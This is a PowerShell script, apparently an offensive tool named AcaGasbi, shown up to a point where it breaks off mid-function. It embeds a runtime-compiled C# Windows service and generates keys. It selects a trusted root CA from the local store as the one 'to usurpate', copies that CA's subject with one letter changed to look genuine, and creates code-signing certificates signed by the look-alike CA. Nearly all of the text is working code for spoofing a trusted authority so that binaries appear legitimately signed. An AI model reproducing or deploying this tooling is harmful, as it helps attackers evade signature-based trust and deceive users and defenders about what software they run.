<# 
DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 
                    Version 2, December 2004 
Copyright (C) 2004 Sam Hocevar <sam@hocevar.net> 
Everyone is permitted to copy and distribute verbatim or modified 
copies of this license document, and changing it is allowed as long 
as the name is changed. 
           DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 
 TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION 

1. You just DO WHAT THE FUCK YOU WANT TO.

         ///\\\  ( Have Fun )
        / ^  ^ \ /
      __\  __  /__
     / _ `----' _ \
     \__\   _   |__\
      (..) _| _ (..)
       |____(___|     Mynameisv_ 2016
_ __ _ (____)____) _ _________________________________ _'
                                      +            o                           
           +              o       x                                      .     
      x             .                                   x    o    +            
   _____      o           ________       +      ___.   .__                     
  /  _  \   ____ _____   /  _____/_____    _____\_ |__ |__|           x        
 /  /_\  \_/ ___\\__  \ /   \  ___\__  \  /  ___/| __ \|  |                    
/    |    \  \___ / __ \\    \_\  \/ __ \_\___ \ | \_\ \  |     +      o       
\____|__  /\___  >____  /\______  (____  /____  >|___  /__|         .          
        \/     \/     \/        \/     \/     \/     \/                        
Autonomous      CA       Generator  and  Signatory Binary       x              
                      o                                               o        
      .                                    +           o                       
           +            x           o                                          
_ __ ___ ____ _ _ ____________________________ ______ __ _ ____ _____ _

Sources and inspirations:
 - Off-line Python+external binary use : https://labs.mwrinfosecurity.com/blog/masquerading-as-a-windows-system-binary-using-digital-signatures/
 - Self signed certificate based on http://www.scriptscoop.site/t/9938ff99d40a/c-how-to-create-a-self-signed-certificate-using-c.html
                                    https://www.sysadmins.lv/blog-en/self-signed-certificate-creation-with-powershell.aspx
 - Service dynamic compilation/execution/installation based on https://msdn.microsoft.com/en-us/magazine/mt703436.aspx
 - Private key structure informations https://msdn.microsoft.com/en-us/library/system.security.cryptography.rsaparameters(v=vs.110).aspx
 - storeLocation and storeName https://msdn.microsoft.com/en-us/library/aa347693.aspx
#'
#>
#
##
###
################################################################
## Parameters and Prerequisites
################################
# Version, name, author...
$global:iVersionMinor = 1;
$global:iVersionMajor = 0;
$global:sScriptName = "AcaGasbi";
$global:sAuthor = "Mynameisv_"; # that looks to be me :-)
#
# Service C# source code, dynamically compiled. This is fucking black magic :-D
$sServiceName = $global:sScriptName+"_Service";
$sLogName = "Application";
$sServiceExeName = $global:sScriptName+"_Service.exe"

$sServiceSourceCode = @"
  using System;
  using System.ServiceProcess;
  using System.Diagnostics;
  using System.Runtime.InteropServices;                                 // SET STATUS
  using System.ComponentModel;
  using System.Reflection;
  using System.Management;
                                           

  public enum ServiceType : int {                                       // SET STATUS [
    SERVICE_WIN32_OWN_PROCESS = 0x00000010,
    SERVICE_WIN32_SHARE_PROCESS = 0x00000020,
  };                                                                    // SET STATUS ]

  public enum ServiceState : int {                                      // SET STATUS [
    SERVICE_STOPPED = 0x00000001,
    SERVICE_START_PENDING = 0x00000002,
    SERVICE_STOP_PENDING = 0x00000003,
    SERVICE_RUNNING = 0x00000004,
    SERVICE_CONTINUE_PENDING = 0x00000005,
    SERVICE_PAUSE_PENDING = 0x00000006,
    SERVICE_PAUSED = 0x00000007,
  };                                                                    // SET STATUS ]

  [StructLayout(LayoutKind.Sequential)]                                 // SET STATUS [
  public struct ServiceStatus {
    public ServiceType dwServiceType;
    public ServiceState dwCurrentState;
    public int dwControlsAccepted;
    public int dwWin32ExitCode;
    public int dwServiceSpecificExitCode;
    public int dwCheckPoint;
    public int dwWaitHint;
  };                                                                    // SET STATUS ]

  public enum Win32Error : int { // WIN32 errors that we may need to use
    NO_ERROR = 0,
    ERROR_APP_INIT_FAILURE = 575,
    ERROR_FATAL_APP_EXIT = 713,
    ERROR_SERVICE_NOT_ACTIVE = 1062,
    ERROR_EXCEPTION_IN_SERVICE = 1064,
    ERROR_SERVICE_SPECIFIC_ERROR = 1066,
    ERROR_PROCESS_ABORTED = 1067,
  };

  public class $sServiceName : ServiceBase {
    private System.Diagnostics.EventLog eventLog;                       // EVENT LOG
    private ServiceStatus serviceStatus;                                // SET STATUS

    public $sServiceName() {
      ServiceName = "$sServiceName";
      CanStop = true;
      CanPauseAndContinue = false;
      AutoLog = true;

      eventLog = new System.Diagnostics.EventLog();                     // EVENT LOG [
      if (!System.Diagnostics.EventLog.SourceExists(ServiceName)) {         
        System.Diagnostics.EventLog.CreateEventSource(ServiceName, "$sLogName");
      }
      eventLog.Source = ServiceName;
      eventLog.Log = "$sLogName";                                        // EVENT LOG ]
      EventLog.WriteEntry(ServiceName, "$sServiceExeName $sServiceName()");      // EVENT LOG
    }

    [DllImport("advapi32.dll", SetLastError=true)]                      // SET STATUS
    private static extern bool SetServiceStatus(IntPtr handle, ref ServiceStatus serviceStatus);

    protected override void OnStart(string [] args) {
      EventLog.WriteEntry(ServiceName, "$sServiceExeName OnStart() // Entry. Starting script '$PScmd $PSArgs'"); // EVENT LOG
      // Set the service state to Start Pending.                        // SET STATUS [
      // Only useful if the startup time is long. Not really necessary here for a 2s startup time.
      serviceStatus.dwServiceType = ServiceType.SERVICE_WIN32_OWN_PROCESS;
      serviceStatus.dwCurrentState = ServiceState.SERVICE_START_PENDING;
      serviceStatus.dwWin32ExitCode = 0;
      serviceStatus.dwWaitHint = 2000; // It takes about 2 seconds to start PowerShell
      SetServiceStatus(ServiceHandle, ref serviceStatus);               // SET STATUS ]
      // Start a child process with another copy of this script
      try {
        //Process p = new Process();
        // Redirect the output stream of the child process.
        //p.StartInfo.UseShellExecute = false;
        //p.StartInfo.RedirectStandardOutput = true;
        //p.StartInfo.FileName = "notepad.exe";
        //p.StartInfo.Arguments = "$PSArgs"; // Works if path has spaces, but not if it contains ' quotes.
        //p.Start();
        // Read the output stream first and then wait. (To avoid deadlocks says Microsoft!)
        //string output = p.StandardOutput.ReadToEnd();
        // Wait for the completion of the script startup code, that launches the -Service instance
        //p.WaitForExit();
        //if (p.ExitCode != 0) throw new Win32Exception((int)(Win32Error.ERROR_APP_INIT_FAILURE));
        // Success. Set the service state to Running.                   // SET STATUS
        serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;    // SET STATUS
      } catch (Exception e) {
        EventLog.WriteEntry(ServiceName, "$sServiceExeName // Failed to start $PScmd $PSArgs. " + e.Message, EventLogEntryType.Error); // EVENT LOG
        // Change the service state back to Stopped.                    // SET STATUS [
        serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;
        Win32Exception w32ex = e as Win32Exception; // Try getting the WIN32 error code
        if (w32ex == null) { // Not a Win32 exception, but maybe the inner one is...
          w32ex = e.InnerException as Win32Exception;
        }    
        if (w32ex != null) {    // Report the actual WIN32 error
          serviceStatus.dwWin32ExitCode = w32ex.NativeErrorCode;
        } else {                // Make up a reasonable reason
          serviceStatus.dwWin32ExitCode = (int)(Win32Error.ERROR_APP_INIT_FAILURE);
        }                                                               // SET STATUS ]
      } finally {
        serviceStatus.dwWaitHint = 0;                                   // SET STATUS
        SetServiceStatus(ServiceHandle, ref serviceStatus);             // SET STATUS
        EventLog.WriteEntry(ServiceName, "$sServiceExeName OnStart() // Exit"); // EVENT LOG
      }
    }

    protected override void OnStop() {
      string cmdArgs; 
      EventLog.WriteEntry(ServiceName, "$sServiceExeName OnStop() // Entry");   // EVENT LOG
      string wmiQuery = string.Format("select ProcessId, CommandLine from Win32_Process where Name='$PScmd'");
      ManagementObjectSearcher search = new ManagementObjectSearcher(wmiQuery);
      ManagementObjectCollection procList = search.Get();
      foreach (ManagementObject process in procList)
      {
                int procId = Convert.ToInt32(process["ProcessId"]);
                Process p = Process.GetProcessById(procId);
                cmdArgs = process["CommandLine"].ToString();
                if (cmdArgs.Contains("$PatterncmdLineProc"))
                {
                    Console.WriteLine(cmdArgs);
                    p.Kill();  
                } 
                // Read the output stream first and then wait. (To avoid deadlocks says Microsoft!)
                string output = p.StandardOutput.ReadToEnd();
                // Wait for the completion of the script startup code, that launches the -Service instance
                p.WaitForExit();
                if (p.ExitCode != 0) throw new Win32Exception((int)(Win32Error.ERROR_APP_INIT_FAILURE));   
       }
      // Change the service state back to Stopped.                      // SET STATUS
      serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;      // SET STATUS
      SetServiceStatus(ServiceHandle, ref serviceStatus);               // SET STATUS
      EventLog.WriteEntry(ServiceName, "$sServiceExeName OnStop() // Exit");    // EVENT LOG
    }

    public static void Main() {
      System.ServiceProcess.ServiceBase.Run(new $sServiceName());
    }
  }
"@
#"
#
##
###
################################################################
## Functions
################################
#
################################
# Convert a X509 Key to RSA Key.
################################
function X509KeyToRsaKey{
   <#
        .SYNOPSIS
        Convert a X509 Key to RSA Key
        X509 key must be create by X509Enrollment.CX509PrivateKey
        Returns a System.Security.Cryptography.RSACryptoServiceProvider object
        Key parameters can be retrieved with this simple code :
        	$oKey = $oRsa.ExportParameters($true);
        	$oKey.P, .Q, .Modulus, ...
        Source: https://msdn.microsoft.com/en-us/library/system.security.cryptography.rsaparameters(v=vs.110).aspx
        
        Author: Mynameisv_
        License: Do what the fuck you want to public license
        
        .PARAMETER oKey
        X509 key object
   #>   
	param(
		[Parameter(Mandatory=$true)]
		$oKey
	)
	# What do we export ?
	# - "PRIVATEBLOB" for private and public
	# - "PUBLICBLOB" for only public part
	$sExportType = "PRIVATEBLOB";
	# 
	#
	# Export/Encoding format:
	# 0 = XCN_CRYPT_STRING_BASE64HEADER (-----BEGIN CERTIFICATE----- + Base64)
	#	1 = XCN_CRYPT_STRING_BASE64 (Base64 only)
	# 2 = 		(Array of bytes)
	# 3 = XCN_CRYPT_STRING_BASE64REQUESTHEADER (-----BEGIN NEW CERTIFICATE REQUEST----- + Base64)
	# 4 = XCN_CRYPT_STRING_HEX (Hex encoded)
	# Source: https://msdn.microsoft.com/en-us/library/windows/desktop/aa374936(v=vs.85).aspx
	$iEncoding = 2
	#
	# Export as Base64 and convert to an array of Bytes, yeah soooooooo dirty ;-)
	$sKeyB64 = $oKey.Export($sExportType, 1);
	$aKeyBytes = [System.Convert]::FromBase64String($sKeyB64);
	# Export as an array of Bytes
	#$aKeyBytes = $oKey.Export($sExportType, $iEncoding);
	#
	# New RSA Provider
	# Source: https://msdn.microsoft.com/fr-fr/library/system.security.cryptography.rsacryptoserviceprovider(v=vs.110).aspx
	$oRsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider;
	#
	# Import the exported array of Bytes
	$oRsa.ImportCspBlob($aKeyBytes);
	#
	return $oRsa;
}
#
################################
# Generate a RSA Key object RSACryptoServiceProvider.
################################
function RSAKeyCreate{
   <#
        .SYNOPSIS
        Generate a RSA Key object RSACryptoServiceProvider
        Key pair is automaticaly generated
        
        Author: Mynameisv_
        License: Do what the fuck you want to public license
        
        .PARAMETER KeySize
        Key size as integer : 2048, 3072, 4096... 16 384
        
        .PARAMETER Xml
        Return key as XML: True=yes, False=no, thank you captain obvious!
        Default value is True
    #>
	param(
		[Parameter(Mandatory=$true)]
		[int32]
		$KeySize,
		
		[Boolean]
		$Xml=$True
	)
	# Check key size with a funny way :)
	$iKeyCheck = [math]::Floor($KeySize/1024);
	if ( (($iKeyCheck*1024) -ne $KeySize) -or ($iKeyCheck -lt 2) -or ($iKeyCheck -gt 16) ){
		write-host " [!] RSAKeyCreate(): KeySize error ($KeySize)";
		return $False;
	} else {
		# Create a new private RSA Key object
		$oRsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider($KeySize);
		#
		# Return as XML ?
		if ($Xml){
			if ($Xml -eq $True){
				return $oRsa.ToXmlString($true);
			}
		}
		return $oRsa;
	}
}
#
################################
# Create a X509 Key object.
################################
function X509KeyCreate{
   <#
        .SYNOPSIS
        Create a X509 Key object
        Returns CX509PrivateKey object containing priv/pub keys
        
        Author: Mynameisv_
        License: Do what the fuck you want to public license
        
        .PARAMETER KeySize
        Key size as integer.
        Values: 2048, 3072, 4096... 16 384
				Default is 2048
				        
        .PARAMETER KeySpec
        Key specification as an integer
        Spec means "usage" and also "limits" ;-).
        Values:
				0 = XCN_AT_NONE
				1 = XCN_AT_KEYEXCHANGE (Encrypt and Sign)
				2 = XCN_AT_SIGNATURE (Only for signing)
        For a CA it should be 2, for a intermediate certtificate it should be 1.
        Default is 2
				Source: https://msdn.microsoft.com/en-us/library/aa379409(VS.85).aspx
        
        .PARAMETER Algorithm
        Algorithm as a string.
				Values: RSA, ECDH_P256, ECDH_P384, ECDH_P521
				Default is RSA
				Source: https://msdn.microsoft.com/en-us/library/windows/desktop/aa376796(v=vs.85).aspx
        
        .PARAMETER Exportable
        Private key is exportable or not, as boolean.
        Values:
				0 = Not exportable
				1 = Exportable
				So obvious ;-)
        Default value is True
				Source: https://msdn.microsoft.com/en-us/library/windows/desktop/aa379002(v=vs.85).aspx
				Source: https://msdn.microsoft.com/en-us/library/aa379412(v=vs.85).aspx
        
        .PARAMETER KeyProtection
        Key protection as an integer.
        Values:
				0 = XCN_NCRYPT_UI_NO_PROTECTION_FLAG
				1 = XCN_NCRYPT_UI_PROTECT_KEY_FLAG
				2 = XCN_NCRYPT_UI_FORCE_HIGH_PROTECTION_FLAG
				Default value is 0 (no protection)
    #>
	param(
		[int32]
		$KeySize = 2048,
		
		[int32]
		$KeySpec = 2,
		
		[string]
		$Algorithm = "RSA",
		
		[boolean]
		$Exportable = $True,
		
		[int32]
		$KeyProtection = 0
	)
	#
	# Create a new private key object
	# Source: http://msdn.microsoft.com/en-us/library/aa378921(VS.85).aspx
	$oKey = New-Object -ComObject "X509Enrollment.CX509PrivateKey";
	#
	# Set the Crypto provider:
	# - "Microsoft Base Cryptographic Provider v1.0" -> old
	# - "Microsoft Base DSS and Diffie-Hellman Cryptographic Provider" -> old
	# - "Microsoft Base DSS Cryptographic Provider" -> old
	# - "Microsoft Enhanced RSA and AES Cryptographic Provider" -> recommended
	# - "Microsoft RSA Schannel Cryptographic Provider" -> old
	# - "Microsoft Strong Cryptographic Provider" -> seems old
	# Source: https://msdn.microsoft.com/en-us/library/windows/desktop/bb931357(v=vs.85).aspx
	$oKey.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider";
	#
	# Check key size with a funny way :)
	$iKeyCheck = [math]::Floor($KeySize/1024);
	if ( (($iKeyCheck*1024) -ne $KeySize) -or ($iKeyCheck -lt 2) -or ($iKeyCheck -gt 16) ){
		write-host " [!] X509KeyCreate(): KeySize error ($KeySize)";
		return $False;
	}
	$oKey.Length = $KeySize;
	#
	# Algorithm
	$oIDAlgo = New-Object -ComObject "X509Enrollment.CObjectId";
	$oIDAlgo.InitializeFromValue(([Security.Cryptography.Oid]$Algorithm).Value);	
	$oKey.Algorithm = $oIDAlgo;
	#
	# Key specification
	$oKey.KeySpec = $KeySpec;
	#
	# Key usage
	# - XCN_NCRYPT_ALLOW_USAGES_NONE         = 0,
	# - XCN_NCRYPT_ALLOW_DECRYPT_FLAG        = 0x1,
	# - XCN_NCRYPT_ALLOW_SIGNING_FLAG        = 0x2,
	# - XCN_NCRYPT_ALLOW_KEY_AGREEMENT_FLAG  = 0x4,
	# - XCN_NCRYPT_ALLOW_ALL_USAGES          = 0xffffff
	# https://msdn.microsoft.com/en-us/library/windows/desktop/aa379417(v=vs.85).aspx
	# Yes, we have to set this here, in the key generation, that's strange
	$oKey.KeyUsage = 0xffffff
	#
	# Private Key is exportable or not ?
	$oKey.ExportPolicy = [int32]$Exportable;
	#
	# Key protection before use
	$oKey.KeyProtection = $KeyProtection;
	#
	# Security Descriptor
	# This looks like magic !
	# https://msdn.microsoft.com/en-us/library/windows/desktop/aa379563(v=vs.85).aspx
	$oKey.SecurityDescriptor = "D:PAI(A;;0xd01f01ff;;;SY)(A;;0xd01f01ff;;;BA)";#(A;;0x80120089;;;NS)";
	#
	# Context
	# - User (Key will be used by user) 							= $false
	# - Machine (Key'll be used by computer/services)	= $true
	$oKey.MachineContext = $true;
	#
	# Key Creation, means generation
	try{
		$oKey.Create();
	} catch {
		write-host " [!] X509KeyCreate(), error during Key generation.";
		write-host $_.Exception.Message;
		return $False;
	}
	return $oKey;
}
#
################################
# Convert a Base64 encoded X509 Certificate to a
# System.Security.Cryptography.X509Certificates.X509Certificate2 object.
################################
function Base64ToX509{
   <#
        .SYNOPSIS
        Convert a Base64 encoded X509 Certificate to a X509 certificate object
        Returns X509Certificate2 object
        
        Author: Mynameisv_
        License: Do what the fuck you want to public license
        
        .PARAMETER Base64Certificate
        Certificate as a string, encoded in base64
    #>
	param(
		[string]
		$Base64Certificate
	)
	#
	# Convert our Base64 encoded Certificate to X509Certificate object
	$oCert = new-object System.Security.Cryptography.X509Certificates.X509Certificate2;
	#
	# Import Base64 decoded certificate
	$oCert.import( [System.Convert]::FromBase64String($Base64Certificate) );
	#
	return $oCert;
}	
#
################################
# Find a certificate informations from existing
################################
function GetCertInformations{
   <#
        .SYNOPSIS
        Find a certificate name from existing
        Returns an array [0]=subject as string
                         [1]=validity not before as datetime
                         [2]=validity not after  as datetime
                         [3]=issuer as string
                         [4]=friendly name as string
        To do : retrieve key size, sign algo, usage (copy)...
        
        Author: Mynameisv_
        License: Do what the fuck you want to public license
        
        .PARAMATER Store
        Store as string where to search for CA to usurpate: User or Machine
        Default is LocalMachine
        
        .PARAMETER Magic
        Magic number as interger to find the original CA
        1 means: choose randomly, yes that dirty ;-D
        Default is the day i am coding this: 20160531
    #>
	param(
		[String]
		$Store,
	
		[int32]
		$Magic
	)
	#
	# Check Magic number
	$iMagic = 20160531;
	if ($Magic){
		if ($Magic -eq 1){
			$iMagic = Get-Random -mi 1 -ma 10000;
		} else {
			$iMagic = [int32] $Magic;
		}
	}
	#
	# Store
	# Get list of certs in an Array of certs
	if ($Store){
		if ($sStore -eq "User"){
			$aCerts = Get-ChildItem cert:\CurrentUser\Root;
		} else {
			$aCerts = Get-ChildItem cert:\LocalMachine\Root;
		}
	} else {
		$aCerts = Get-ChildItem cert:\LocalMachine\Root;
	}
	#
	# Find the CA to usurpate
	$iMagic = $iMagic % $aCerts.count;
	#
	return @(	$aCerts[$iMagic].Subject,
						$aCerts[$iMagic].NotBefore,
						$aCerts[$iMagic].NotAfter,
						$aCerts[$iMagic].Issuer,
						$aCerts[$iMagic].FriendlyName);
}
#
################################
# Change one random letter, randomly in a Subject and returns it
################################
function ChangeCertificateSubject{
   <#
        .SYNOPSIS
        Change one random letter, randomly in a Subject and returns it
        Returns the new subject as string
        
        Author: Mynameisv_
        License: Do what the fuck you want to public license
        
        .PARAMATER Subject
        Subject as string to change
    #>
	param(
		[String]
		$Subject
	)
	#
	# Change letters of the Subject
	# Not as easy at it seems to be.
	# Can't split by coma, 'cause some CA have coma in their name.
	# Can't split by coma+space, for the same reason.
	# The easiest way (not the best one) is to split by equal but each element
	# have next element attribute at its end. 
	$aAttributes = $Subject.split("=");
	#
	# Change only second one, hope it's the right one ;-) (first one should be "CN")
	# To exclude the attribute tag, let's find the last space
	$iPos = $aAttributes[1].LastIndexOf(" "); #"
	if ($iPos -eq -1){
		# Something's wrong !!?
		write-host " [!] ChangeCertificateSubject(), error in CA Subject first attribute:{" $aCerts[$iMagic] "} -> {" $aAttributes[1] "}";
		return $False;
	}
	#
	# Max number of loops to find a letter to replace
	$iMax = 100;
	do {
		# Get random char from 1 to end minus attribute (not the first one to induce doubt)
		$iChange = Get-Random -mi 1 -ma $iPos;
		# We are looking only for letter, that incremented is still a letter [a-z][A-Z], to avoid strange side effect
		$sChar = [string][char](([int]$aAttributes[1][$iChange])+1);
		if ( ($sChar -cmatch "[a-z]") -or ($sChar -cmatch "[A-Z]") ){
			# Can't change a single char in string, so here is a workarround
			$aAttributes[1] = $aAttributes[1].SubString(0, $iChange) + $sChar + $aAttributes[1].SubString($iChange+1);
			break;
		}
	} while ($iMax-- -gt 0);
	if ($iMax -eq 0){
		ColorShow -Level 1 -Msg "ChangeCertificateSubject(), Subject character replacement ceil reached. Did not find a Letter to replace in 100 loops !!?";
		return $False;
	}
	#
	# Subject rebuild
	$sSubject = "";
	foreach ($sSub in $aAttributes){
		$sSubject+= $sSub;
		$sSubject+= "=";
	}
	# Remove the last added equal
	$sSubject = $sSubject.SubString(0,$sSubject.Length-1);
	#
	return $sSubject;
}
#
################################
# Create a X509 Certificate
################################
function X509CertCreate{
   <#
        .SYNOPSIS
        Create a X509 Certificate
        Returns X509 Certificate base64 encoded
        
        Author: Mynameisv_
        License: Do what the fuck you want to public license
        
        .PARAMETER oKey
        CX509PrivateKey object containing priv/pub keys
        Value: a X509Enrollment.CX509PrivateKey object
        
        .PARAMETER Subject
        Certificate subject as a string
        Value: CN=blah blah...
        
        .PARAMETER Issuer
        Certificate issuer as a string
        Value: Blah blah...
        
				.PARAMETER FriendlyName
        Certificate Friendly Name as a string
        Default is "Test"
        
        .PARAMETER Hash
        Hash algorithm as a string, must be: SHA256, SHA384 or SHA512
        Default is "SHA256" (SHA2-256 bits)
        
        .PARAMETER BeforeValidity
				Start of validity as DateTime
				Default is Now
        
        .PARAMETER AfterValidity
				End of validity as DateTime
				Default is random between 3 and 10 years
				
        .PARAMETER ExportForm
				Export/Encoding format:
				0 = XCN_CRYPT_STRING_BASE64HEADER (-----BEGIN CERTIFICATE----- + Base64)
				1 = XCN_CRYPT_STRING_BASE64 (Base64 only)
				2 = XCN_CRYPT_STRING_BINARY	(Array of bytes)
				3 = XCN_CRYPT_STRING_BASE64REQUESTHEADER (-----BEGIN NEW CERTIFICATE REQUEST----- + Base64)
				4 = XCN_CRYPT_STRING_HEX (Hex encoded)
				Source: https://msdn.microsoft.com/en-us/library/windows/desktop/aa374936(v=vs.85).aspx
				Default is 0
				
				.PARAMETER CACert
				Are we creatin an CA or a certificate
				Default is $True
				
				.PARAMETER CAObject
				X509Certificate2 as on Object to sign the certificate generated by this function.
				Required only if CACert is $False
				It not set, CASubject is required.
				
				.PARAMETER CASubject
				CA Subject as String to search in cert:\LocalMachine\Root to sign the certificate generated by this function.
				Required only if CACert is $False
				It not set, CAObject is required.
				Value: CN=blah blah...
    #>
	param(
		[Parameter(Mandatory=$true)]
		$oKey,
		
		[Parameter(Mandatory=$true)]
		[String]
		$Subject,
		
		[Parameter(Mandatory=$true)]
		[String]
		$Issuer,
		
		[String]
		$FriendlyName = "Test",
		
		[String]
		$Hash = "SHA256",
		
		[DateTime]
		$BeforeValidity,
		
		[DateTime]
		$AfterValidity,
	
		[int32]
		$ExportForm,
		
		[boolean]
		$CACert = $True,
		
		[Object]
		$CAObject,
		
		[string]
		$CASubject
	)
	#
	# Creation of a Self Signing certificate Request
	# Source: http://msdn.microsoft.com/en-us/library/aa377124(VS.85).aspx
	$oCert = New-Object -ComObject "X509Enrollment.CX509CertificateRequestCertificate";
	#
	# Context defining the target user of the certificate as in integer
	# Must be linked to $oKey.MachineContext that is a boolean
	# - ContextUser (For a end user) 										= 1 (is $False in oKey)
	# - ContextMachine (For a computer/services)				= 2 (is $True in oKey)
	# - ContextAdministratorForceMachine (For computer)	= 3
	# Source: https://msdn.microsoft.com/fr-fr/library/windows/desktop/aa379399(v=vs.85).aspx
	$iContext = ([int32]$oKey.MachineContext) + 1;
	#
	# Template name for the request
	$sTemplateName = "";
	#
	# Request initialisation with the private key CX509PrivateKey object
	# Source: https://msdn.microsoft.com/fr-fr/library/windows/desktop/aa377527(v=vs.85).aspx
	$oCert.InitializeFromPrivateKey($iContext, $oKey, $sTemplateName);
	#
	# Subject / Common Name
	# Encode as XCN_CERT_NAME_STR_NONE=0
	# Source: https://msdn.microsoft.com/en-us/library/windows/desktop/aa379394(v=vs.85).aspx
	$sSubject = $Subject;
	$oSubject = New-Object -ComObject "X509Enrollment.CX500DistinguishedName";
	$oSubject.Encode($sSubject, 0);
	$oCert.Subject = $oSubject;
	#
	# Issuer
	# Encode as XCN_CERT_NAME_STR_NONE=0
	# Source: https://msdn.microsoft.com/en-us/library/windows/desktop/aa379394(v=vs.85).aspx
	$sIssuer = $Issuer;
	$oIssuer = New-Object -ComObject "X509Enrollment.CX500DistinguishedName";
	$oIssuer.Encode($sIssuer, 0);
	$oCert.Issuer = $oIssuer;
	#
	# Certificate validity
	# Start of validity
	if ($BeforeValidity){
		$oCert.NotBefore = $BeforeValidity;
	} else {
		# Let's say Noooooowwww !
		$oCert.NotBefore = Get-Date;
	}
	# End of validity
	if ($AfterValidity){
		$oCert.NotAfter = $AfterValidity;
	} else {
		$iValidity = (Get-Random -minimum 3 -maximum 10)*365;
		$oCert.NotAfter = $oCert.NotBefore.AddDays($iValidity);
	}
	#
	# Certificate Usages
	$aUsages = @("1.3.6.1.5.5.7.3.1", # ServerAuth / Web server SSL/TLS
							"1.3.6.1.5.5.7.3.2", # ClientAuth
							"1.3.6.1.4.1.311.20.2.2", # SmartCardAuth
							"1.3.6.1.4.1.311.10.3.4", #EFS encryption
							"1.3.6.1.5.5.7.3.3"); # Code Signing
	$aUsages = @("1.3.6.1.5.5.7.3.3");
	#
	# List of usages
	$oIDUsages = New-Object -ComObject "X509Enrollment.CObjectIds";
	#
	# Add atomic usage
	foreach ($sUsage in $aUsages){
		# Create the local object
		#write-host "Key usage:" $sUsage;
		$oIDUse = New-Object -ComObject "X509Enrollment.CObjectId";
		$oIDUse.InitializeFromValue($sUsage);
		$oIDUsages.Add($oIDUse);
	}
	#
	# Creation of the real usage object (not well documented on MSDN)
	$oKeyUsages = New-Object -ComObject "X509Enrollment.CX509ExtensionEnhancedKeyUsage";
	$oKeyUsages.InitializeEncode($oIDUsages);
	#
	# Add our usages
	$oCert.X509Extensions.Add($oKeyUsages);
	#
	# Hash algorithm
	$oIDHash = New-Object -ComObject "X509Enrollment.CObjectId";
	$oIDHash.InitializeFromValue(([Security.Cryptography.Oid]$Hash).Value);
	$oCert.SignatureInformation.HashAlgorithm = $oIDHash;
	#
	# Length of the Path certification, number of sub-CA of this CA
	# Source: https://msdn.microsoft.com/en-us/library/aa378108(v=vs.85).aspx
	if ($CACert){
		# It's a CA
		# We specify the key chain length to 1, because we'll generate one signing certificate
		$iPathLen = 1;
		$oIDConstraints = New-Object -ComObject "X509Enrollment.CX509ExtensionBasicConstraints";
		$oIDConstraints.InitializeEncode("true", $iPathLen);
		$oCert.X509Extensions.Add($oIDConstraints);
	} else {
		if ($CAObject){
			# Check that we have a real X509Certificate2 certificate object
			if ($CAObject.GetType().Fullname -like "*X509Certificate2"){
				# Nothing to do here, all is ok :-)
			} else {
				ColorShow -Level 5 "Error, CAObject is not a X509Certificate2 Object.";
				return $False;
			}
		} elseif ($CASubject){
			#
			# Find the CA so sign with
			# Depending on the request, the result can be an array of cert object or an cert object
			# Thank you Microsoft for return different type :'(
			$aCA = (Get-ChildItem Cert:\LocalMachine\Root | Where-Object {$_.Subject -match $CASubject });
			if ($aCA.length -gt 0){
				# Only one result and it's an object ?
				if ($aCA.GetType().Fullname -like "*X509Certificate2*"){
					$CAObject = $aCA;
				} elseif ($aCA.GetType().Fullname -like "*Object*"){
					# Array of X509 objects. Let's hope our CA is the first one
					$CAObject = $aCA[0];
				} else {
					$sMsg = "Error, Get-ChildItem returned unknown object {"+$aCA.GetType().Fullname+"}";
					ColorShow -Level 5 $sMsg;
					return $False;
				}
			} else {
				ColorShow -Level 5 "Error, no CA found containing the Subject {$CASubject}";
				return $False;
			}
		} else {
			ColorShow -Level 5 "Error, missing CAObject or CASubject.";
			return $False;
		}

		#
		# Sign the certificate
		# Source: https://msdn.microsoft.com/en-us/library/windows/desktop/aa376832(v=vs.85).aspx
		$oCSigner = New-Object -ComObject "X509Enrollment.CSignerCertificate";
		#
		# Where to seach for the certificate used as the fourth parameter
		# $True = computer
		# $False = user
		$iMachineContext = $True;
		#
		# The way the existance of the private key is checked
		# 0 = VerifyNone, no check
		# 1 = VerifySilent, checks silently
		# 2 = VerifySmartCardNone, no check if the key is on a smartcard
		# 3 = VerifySmartCardSilent, checks silently is on a smartcard
		# 4 = VerifyAllowUI, displays a user interface
		# Source: https://technet.microsoft.com/fr-fr/evalcenter/aa379424
		$iVerify = 0;
		#
		# Export/Encoding format of the Certificate used for signing:
		# 0 = XCN_CRYPT_STRING_BASE64HEADER (-----BEGIN CERTIFICATE----- + Base64)
		#	1 = XCN_CRYPT_STRING_BASE64 (Base64 only)
		#     -> [System.Convert]::ToBase64String($CA.GetRawCertData())
		# 2 = XCN_CRYPT_STRING_BINARY	(Array of bytes)
		# 3 = XCN_CRYPT_STRING_BASE64REQUESTHEADER (-----BEGIN NEW CERTIFICATE REQUEST----- + Base64)
		# 4 = XCN_CRYPT_STRING_HEX (Hex encoded)
		#			-> $CA.Thumbprint or $CA.GetRawCertDataString()
		# Source: https://msdn.microsoft.com/en-us/library/windows/desktop/aa374936(v=vs.85).aspx
		$iExport = 4;
		#
		$oCSigner.Initialize($iMachineContext, $iVerify, $iExport, $CAObject.Thumbprint);
		#
		# Add the signature
		$oCert.SignerCertificate = $oCSigner;
	}
	#
	# Finish the certificate request building
	# It's a very strange method name for that function !!!
	$oCert.Encode();
	#
	# Generate the certificate (Enroll it)
	# http://msdn.microsoft.com/en-us/library/aa377809(VS.85).aspx
	$oEnroll = New-Object -ComObject "X509Enrollment.CX509Enrollment";
	#
	# Load the certificate request
	$oEnroll.InitializeFromRequest($oCert);
	#
	# Friendly Name
	write-host "FriendlyName = " $FriendlyName;
	if ($FriendlyName){
		$oEnroll.CertificateFriendlyName = $FriendlyName;
	} else {
		$oEnroll.CertificateFriendlyName = "TEST";
	}
	#
	# Export/Encoding format:
	# 0 = XCN_CRYPT_STRING_BASE64HEADER (-----BEGIN CERTIFICATE----- + Base64)
	#	1 = XCN_CRYPT_STRING_BASE64 (Base64 only)
	# 2 = XCN_CRYPT_STRING_BINARY	(Array of bytes)
